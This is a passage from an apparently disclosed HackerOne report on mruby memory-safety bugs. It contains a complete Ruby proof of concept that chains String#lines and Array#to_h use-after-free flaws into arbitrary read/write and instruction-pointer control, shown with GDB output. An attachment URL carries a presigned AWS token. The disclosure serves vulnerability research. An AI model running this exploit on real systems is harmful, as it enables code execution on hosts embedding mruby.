class=\"p\"\u003e],[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;a\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e],[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;a\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e],[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;a\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\u003cspan class=\"no\"\u003eA\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003enew\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"k\"\u003ein\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e..\u003c/span\u003e\u003cspan class=\"mi\"\u003e256\u003c/span\u003e\n \u003cspan class=\"vg\"\u003e$bb\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003epush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;z\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"vg\"\u003e$size\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n\u003cspan class=\"vi\"\u003e@a\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"vg\"\u003e$a\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eto_h\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"exploitation\"\u003eExploitation\u003c/h2\u003e\n\n\u003cp\u003eIn the second POC, and attacker creates an array of 7 elements where the last element has an object with the vulnerable to_ary method.  7 elements is important because when the bug is triggered the index of the array will be out of bounds by 3 pointer size.  That is where our data will be.\u003c/p\u003e\n\n\u003cp\u003eafter clearing the global array push some elements back into the array. No more than 4 since that will increase the capacity of the array to 8 and our index will not be out of bounds.\u003c/p\u003e\n\n\u003cp\u003eby pushing the large strings the data of the strings will be placed after the array data.  When the call is made to \u003ccode\u003emrb_obj_classname(mrb, RARRAY_PTR(ary)[i])\u003c/code\u003e,\u003cbr\u003e\nuser controlled data will be returned.  \u003c/p\u003e\n\n\u003cp\u003eAn attacker could then craft an \u003ccode\u003emrb_value\u003c/code\u003e object using the strings and cause farther memory corruption.\u003c/p\u003e\n\n\u003cp\u003eThere exists code paths that could allow an attacker to right data to a pointer crafted by the attacker.\u003c/p\u003e\n\n\u003ch2 id=\"proposed-fix\"\u003eProposed Fix\u003c/h2\u003e\n\n\u003cp\u003eSee patch in attachment.\u003c/p\u003e\n","bounty_amount":"20000.0","formatted_bounty":"$20,000","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-01-15T19:46:22.752Z","allow_singular_disclosure_after":-124707544.89775614,"singular_disclosure_allowed":true,"vote_count":29,"voters":["dkasak","isra17","michiel","bl4de","bogdantcaciuc","mdv","mpz","eveeez","r3y","khizer47","and 19 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1293228,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Forgot the patch.","markdown_message":"\u003cp\u003eForgot the patch.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-10T13:19:38.955Z","updated_at":"2016-11-10T13:19:38.955Z","actor":{"username":"isra17","cleared":false,"url":"/isra17","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":133846,"filename":"0001-Fix-out-of-bound-access-in-Array-to_h.patch","type":"text/x-diff","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/133/846/0822712d3690e8d276be77a42a9e3685dfe4bfad/0001-Fix-out-of-bound-access-in-Array-to_h.patch?response-content-disposition=attachment%3B%20filename%3D%220001-Fix-out-of-bound-access-in-Array-to_h.patch%22%3B%20filename%2A%3DUTF-8%27%270001-Fix-out-of-bound-access-in-Array-to_h.patch\u0026response-content-type=text%2Fx-diff\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IZIDGEJ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T044527Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHgvhPRXI%2B7x6zNGnfFbWtzZacTUlKPt3VwSApQji3YyAiEA2Y%2FuJ72LgjXuchHTkycORzGcHp9y6ZUl%2BeyKz%2FFfjlAqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDHblJHa0bCSVtoiX8yqRA7Ct%2F1l8ihdf2xXnJNUaJGv7nq%2F1b1xXdqHLpOjb5bN22Ac%2BQjHl%2Bna1KjqQx0Qu8Fcs0WQUm6dGPZbHLiP%2FRkIHh6FlY41MtajX39mvBrMgWCmioQD4vc7NSsiqHLG4GmvgnIM0wWXfwwv%2Fmq%2BjRWJQacOyz7e9kYXzI%2BQkViUKmcuV48xoXGswHYXnPSqKC6IqSk0Rgc6j2xAmne60g5PNHQf%2BehWLSoXupow19n2vF%2BE4dhw1ZLX%2B9fBct02t5%2B41MEA5z30yhC52UxDX9%2BedHi3rXpTTyV%2FX%2BWfdeGSGSqmwrTAcipCpz01NR%2Fkk3srD5BLQB%2B6BdeDlwwcltfcgYdKO39yRPNyZePA9ihdN%2B4YHA7%2FY9ufCPbEevGDvtv3mVStbES31aUOxSmGNj%2B8fMMJqFBAtD4Qx54l8UFyMf%2BQ8PPbA0OLpU9rjip1L0zxevK6IGISP%2FPlDldWsNQvfi1Xn6QvRkmL1ANNGXqycx5MDUJExPyV801VOQ68%2FfbB87Cmdd8xIJWUNtmpsIgDtMO2wqv8FOusBRxy8OOzTGCKFydY5xn2aZtaPj3obazs55j%2BS5FoY%2BdkqAuB4pbyPDlTBBI%2Fe4ZIYYBH9t51VaQaRwrhKPTTntuBcC2b5uuKcGXYq9rnIAgbUHulNqSoxgZep0wAjzrLEFeECcDfqDCjG1QyXJkGQyq3UjLElJNKzeGgK4y5hW9emXis3wfoUPLixiL7W8M52b0Q9HQrT0RxnkkNSLj7aPyOAVCPImHNwjJ%2FI2KIbB5iD4e9PbxcHFvjKgkNUQh2pESECovpzx%2BAz7wsT%2FUMRieGT%2BFtMt1o90%2BewPxe95i025ZqzwWI1aVcXtA%3D%3D\u0026X-Amz-Signature=c92750937df570e57a6af0d683bb06730d556213e9d05445f34fcd2fcfe61df4"}],"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1293516,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@isra17 since we may end up using the patch you submitted (or parts of it) I just want to confirm in writing that you agree to release it under the original project license (MIT License). We'll attribute the patches to you by linking to this issue and your github account if you wish.","markdown_message":"\u003cp\u003e\u003ca href=\"/isra17\"\u003e@isra17\u003c/a\u003e since we may end up using the patch you submitted (or parts of it) I just want to confirm in writing that you agree to release it under the original project license (MIT License). We\u0026#39;ll attribute the patches to you by linking to this issue and your github account if you wish.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-10T15:53:12.273Z","updated_at":"2016-11-10T15:53:12.273Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1293538,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I agree to release it under the original project license.","markdown_message":"\u003cp\u003eI agree to release it under the original project license.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-10T16:01:42.673Z","updated_at":"2016-11-10T16:01:42.673Z","actor":{"username":"isra17","cleared":false,"url":"/isra17","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1298888,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We've reproduced the issue, and our engineering team is working on a fix.","markdown_message":"\u003cp\u003eThank you for your report. We\u0026#39;ve reproduced the issue, and our engineering team is working on a fix.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-14T19:01:15.687Z","updated_at":"2016-11-14T19:01:15.687Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1301031,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you again for this great report. We've resolved this issue in our production environment and the fix has been submitted upstream: https://github.com/mruby/mruby/commit/739dad6e87e91c74cda794ae3f33cd94a7c33eb1\n\nI'm marking this issue as resolved now but we still need to assess the impact \u0026  determine a final bounty amount. This may take a few weeks since we received a large number of valid issues and we want to calibrate our payouts across all of them.","markdown_message":"\u003cp\u003eThank you again for this great report. We\u0026#39;ve resolved this issue in our production environment and the fix has been submitted upstream: \u003ca title=\"https://github.com/mruby/mruby/commit/739dad6e87e91c74cda794ae3f33cd94a7c33eb1\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fcommit%2F739dad6e87e91c74cda794ae3f33cd94a7c33eb1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/commit/739dad6e87e91c74cda794ae3f33cd94a7c33eb1\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m marking this issue as resolved now but we still need to assess the impact \u0026amp;  determine a final bounty amount. This may take a few weeks since we received a large number of valid issues and we want to calibrate our payouts across all of them.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-15T20:18:30.269Z","updated_at":"2016-11-15T20:18:30.269Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"isra17","url":"/isra17"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1314430,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Finally, here's RCE PoC using both the String#lines and Array#to_h bugs:\n\n```ruby\n# Helper functions\ndef puts *_;end\n# Convert a Integer to bytes in little-endian\ndef pack(n)\n  p = \"\\x00\"*8\n  8.times do |i|\n    b = n% 256\n    p.setbyte(i,b)\n    n = n/256\n  end\n  return p\nend\n\n# Convert a string in little-endian to an Integer\ndef unpack(p)\n  n = 0\n  8.times do |i|\n    n += p.getbyte(i) * (256**i)\n  end\n  return n\nend\n\n# Convert a byte array little-endian to an Integer\ndef unpack_a(p)\n  n = Integer(0)\n  p.length.times do |i|\n    n += p[i] * (256**i)\n  end\n  return n\nend\n\n# Write a string into another\ndef write(s, b, o=0)\n  b.bytesize.times{|i|s.setbyte(o+i, b.getbyte(i))}\nend\n\n# Clean the Heap\nGC.start\n\n# Set up the exploit vars\n@a = []\n$a = Array.new 1024\n$b = nil\nplaceholder = \"a\" * (1024*48+6*8-1)\n$lines = placeholder * 1\n$lines[0] = \"\\n\"\n$leak = \"\"\nGC.start\n\n# Leak a garbage collector chunk that contains mbr_object, leaking\n# a known RString structure and its -\u003eptr value.\n$state = 0\n$lines.lines do |l|\n  if $state == 0\n    #puts '[*] Freeing $lines'\n    $lines.clear\n    #puts \"[*] Start GC\"\n    GC.start\n    GC.disable\n    # Create var to force GC to allocate a new mbr_object chunk.\n    1024.times{$b = \"a\"*1}\n    $c = \"\"\n    $str = \"X\" * 0xff\n    # Keep a sentinel to easily retrieve $str. Also used later for Read/Write primitive.\n    $b = \"\\xFE\\xFE\\xFE\\xFE\\xFE\\xFE\\xFE\\xFE\"\n    $state=1\n  else\n    $leak += l\n  end\nend\n\n\n@a \u003c\u003c $leak.bytesize.to_s(16)\n# String#index is buggy, so fallback to Array#index\n# Might be also buggy.\nleak = $leak.bytes\ncan_i = 0\ncan_i = leak.index(0xfe)\n@a\u003c\u003ccan_i\n\n# This is the leaked RString.\nstr_obj = leak[can_i+24..can_i+24+47]\n\n# Leaked RString-\u003eptr value.\n$str_ptr = unpack_a(str_obj[-8..-1])\n# Leaked RString address.\n$str_addr=($str.object_id^0x10)\n#puts \"[*] str: #{$str.object_id^0x10}\"\n#puts \"[*] str-\u003eptr: #{$str_ptr}\"\n\n# Now use the Array#to_h use-after-free exploit.\nclass A\n  def to_ary\n    #puts \"[*] to_ary\"\n    # Free the Array.\n    $uaf.clear\n    # Create a smaller array that will be allocated at the same spot.\n    $uaf.replace $new_array\n    $new_array.clear\n\n    # Allocate the string right after the Array. The string will be used by #to_h as an\n    # element from the Array. The crafted element has a buggy class pointer used\n    # to throw an exception by #to_h. The buggy class pointer allow us to write an\n    # arbitrary pointer value anywhere (To an RString-\u003elen in our case).\n    $a = \"A\"*(0x40*8)\n  \n    # \u0026str-\u003eptr[0]\n    write($a, pack($str_ptr), 0)\n    #  0x0: tt Not used\n    #  0x8: c = \u0026EKlass\n    write($str, pack($str_ptr+0x30), 8)\n\n    # \u0026Klass [0x30]:\n    # 0x00: tt = 9\n    # 0x08: c, Not used\n    # 0x10: gc, Not used\n    # 0x18: iv -\u003e \u0026IvTable\n    write($str, pack($str_ptr+0x60),0x30+0x18)\n                # \u0026IVTable [0x60]:\n    # 0x00: n_buckets\n    write($str, pack(0x4), 0x60)\n    # 0x04: size\n    # 0x08: n_occupied\n    write($str, pack(0x1), 0x60 + 8)\n    # 0x10: ed_flags = [Occupied, Empty]\n    write($str, pack($str_ptr+0x90),0x60+0x10)\n    # 0x18: keys = [H(:__classid__), 0]\n    write($str, pack($str_ptr+0x90+4),0x60+0x18)\n    # 0x20: vals = [!0, (str-\u003elen)]\n    write($str, pack($str_addr + 24-8),0x60+0x20)\n\n    #write($str, pack(0x1),48+48+4)\n    write($str, \"\\x08\\x08\\x20\\x80\",48+48+48)\n    # key items\n    write($str, \"\\x06\\x00\\x00\\x00\",48+48+48+4)\n    write($str, \"\\x06\\x00\\x00\\x00\",48+48+48+8)\n    write($str, \"\\x06\\x00\\x00\\x00\",48+48+48+12)\n    write($str, \"\\x06\\x00\\x00\\x00\",48+48+48+16)\n\n    #puts \"[*] Done\"\n    nil\n  end\nend\n\n#puts \"[*] Alloc array\"\n# Fill the holes\n300.times{$a = \"C\"*(0x100-1)}\n100.times{$a = \"C\"*(0x200-1)}\n# Create the array that will trigger the UAF\n$uaf = Array.new 68\n$uaf_len = Integer($uaf.length/2)\n$new_array = Array.new(0x40)\n$uaf.length.times{|i|$uaf[i] = [0,0]}\n$uaf[-2] = A.new\n\n#puts \"[*] to_h Exploit\"\nbegin\n        $uaf.to_h\nensure\n  # $str is now corrupted with a big length. Warning: Do not use regular\n  # string function or else: Crash. Bytes function (setbyte/getbyte/bytesize work well\n  # with corrupted strings).\n\n  # luckily the $str-\u003eptr is before the $str and $b RString :). We use this occasion\n  # to rewrite $b RString.\n  $off = $str_addr - $str_ptr - 48\n  # Remove the RSTRING_EMBED flag from $b.\n  $str.setbyte($off+1, 0)\n  $str.setbyte($off+2, 0)\n  # Set the $b length at 0xffffffff\n  write($str, pack(0xffffffff), $off+24)\n\n  # Set $b-\u003eptr\n  def set_ptr(p)\n    write($str, pack(p), $off+40)\n  end\n\n  # Read anywhere\n  def r(addr, n)\n    set_ptr(addr)\n    b = []\n    n.times {|i| b \u003c\u003c $b.getbyte(i)}\n    return b\n  end\n\n  # Write anywhere\n  def w(addr, data)\n    set_ptr(addr)\n    data.bytesize.times {|i| $b.setbyte(i, data.getbyte(i))}\n  end\n\n  # Create Proc object.\n  code = Proc.new{}\n  code_addr = code.object_id ^ 13\n  # Set the function to target.\n  w(code_addr + 2, \"\\x0c\")\n  w(code_addr + 24, 'AAAAAAAA')\n\n  # Win!\n  code.call\nend\n```\n\nResult from GDB\n```\n0x00007f5c5bc8153b in mrb_vm_exec (mrb=mrb@entry=0x1f00000004e0,\n    proc=\u003coptimized out\u003e, proc@entry=0x1f000011b320, pc=\u003coptimized out\u003e)\n    at /home/isra/devel/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1235\n1235            recv = m-\u003ebody.func(mrb, recv);\n(gdb) x m-\u003ebody.func\n0x4141414141414141:     Cannot access memory at address 0x4141414141414141\n(gdb)\n```","markdown_message":"\u003cp\u003eFinally, here\u0026#39;s RCE PoC using both the String#lines and Array#to_h bugs:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e# Helper functions\u003c/span\u003e\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eputs\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003e_\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003cspan class=\"c1\"\u003e# Convert a Integer to bytes in little-endian\u003c/span\u003e\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003epack\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"nb\"\u003ep\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\x00\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"mi\"\u003e8\u003c/span\u003e\n  \u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003etimes\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eb\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"o\"\u003e%\u003c/span\u003e \u003cspan class=\"mi\"\u003e256\u003c/span\u003e\n    \u003cspan class=\"nb\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003esetbyte\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"mi\"\u003e256\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nb\"\u003ep\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e# Convert a string in little-endian to an Integer\u003c/span\u003e\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eunpack\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"n\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\n  \u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003etimes\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\n    \u003cspan class=\"n\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"nb\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003egetbyte\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e256\u003c/span\u003e\u003cspan class=\"o\"\u003e**\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e# Convert a byte array little-endian to an Integer\u003c/span\u003e\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eunpack_a\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"n\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eInteger\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"nb\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003elength\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003etimes\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\n    \u003cspan class=\"n\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"nb\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e256\u003c/span\u003e\u003cspan class=\"o\"\u003e**\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e# Write a string into another\u003c/span\u003e\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eo\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003ebytesize\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003etimes\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003esetbyte\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eo\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003egetbyte\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e))}\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e# Clean the Heap\u003c/span\u003e\n\u003cspan class=\"no\"\u003eGC\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003estart\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e# Set up the exploit vars\u003c/span\u003e\n\u003cspan class=\"vi\"\u003e@a\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[]\u003c/span\u003e\n\u003cspan class=\"vg\"\u003e$a\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eArray\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003enew\u003c/span\u003e \u003cspan class=\"mi\"\u003e1024\u003c/span\u003e\n\u003cspan class=\"vg\"\u003e$b\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kp\"\u003enil\u003c/span\u003e\n\u003cspan class=\"n\"\u003eplaceholder\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;a\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1024\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"mi\"\u003e48\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"mi\"\u003e6\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"vg\"\u003e$lines\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e 